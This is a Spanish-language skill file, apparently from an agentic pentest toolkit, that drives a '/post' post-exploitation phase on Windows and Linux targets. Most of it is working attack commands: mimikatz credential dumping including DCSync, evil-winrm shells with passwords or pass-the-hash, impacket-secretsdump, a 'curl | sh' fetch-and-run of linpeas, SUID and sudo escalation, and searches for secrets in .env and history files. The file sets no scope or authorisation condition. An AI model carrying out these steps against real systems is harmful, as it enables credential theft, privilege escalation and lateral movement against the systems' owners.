---
name: /post
description: Ejecuta post-explotación para escalar privilegios, recolectar credenciales y preparar movimiento lateral.
version: 0.1
author: h4ckforge
license: MIT
---

## When to Use

Después de obtener acceso inicial documentado en session_state.findings[]. Si phase_complete = false en exploit, advertir: "No hay acceso inicial documentado. Ejecutar /exploit primero."

## Quick Reference

**Windows**

| Herramienta | Uso |
|---|---|
| mimikatz | Dump de credenciales, hashes NTLM, tickets Kerberos |
| Evil-WinRM | Shell remota sobre WinRM (puerto 5985/5986) |
| impacket-secretsdump | Dump remoto de SAM/NTDS sin subir binarios |
| impacket-psexec | Ejecución remota con credenciales válidas |

**Linux**

| Herramienta | Uso |
|---|---|
| linpeas.sh | Enumeración automática de vectores de escalada |
| sudo -l | Listar comandos sudo disponibles sin contraseña |
| find / -perm -4000 | Buscar binarios SUID |
| /etc/passwd, /etc/shadow | Verificar usuarios y hashes si son legibles |

## Procedure

Detectar OS desde session_state.findings[] (campo notas o resultado de sysinfo/uname).

**Rama Windows:**
1. Verificar privilegios: `whoami /priv`, `net user <usuario>`, `net localgroup administrators`.
2. Dump de credenciales con mimikatz (requiere privilegios elevados):
   - `privilege::debug`
   - `sekurlsa::logonpasswords`
   - `lsadump::sam`
   - `lsadump::dcsync /user:Administrator` — si hay acceso a DC.
3. Shell remota con credenciales:
   - `evil-winrm -i <target> -u <usuario> -p <password>`
   - Con hash: `evil-winrm -i <target> -u <usuario> -H <NTLM_hash>`
4. Dump remoto: `impacket-secretsdump <dominio>/<usuario>:<password>@<target>`
5. Documentar: credenciales/hashes obtenidos, nivel de privilegio.

**Rama Linux:**
1. Verificar usuario: `id`, `whoami`.
2. Correr linpeas: transferir y ejecutar localmente o `curl -L <url> | sh`.
3. Revisar sudo: `sudo -l` — explotar entradas sin contraseña via GTFOBins.
4. Buscar SUID: `find / -perm -4000 -type f 2>/dev/null` — comparar con GTFOBins.
5. Revisar cron: `cat /etc/crontab`, `ls /etc/cron.*`.
6. Buscar credenciales en archivos: `.env`, `config.php`, archivos de historial.
7. Documentar: vector de escalada, comando exacto, evidencia de privilegio obtenido.

## Pitfalls

- mimikatz requiere SeDebugPrivilege — si whoami /priv no lo muestra, escalar primero.
- Evil-WinRM requiere WinRM habilitado (puerto 5985) — verificar con nmap antes de intentar.
- linpeas genera mucho output — priorizar items marcados con [+] o en rojo/amarillo.
- Pass-the-hash con evil-winrm solo funciona sin restricción de LocalAccountTokenFilterPolicy.

## Verification

La fase de post-explotación está completa si:
- session_state.findings[] contiene credenciales adicionales, hashes, o evidencia de escalada de privilegios.
- session_state.pending_actions[] lista próximos objetivos de movimiento lateral si aplica.
- session_state.mode = "post".
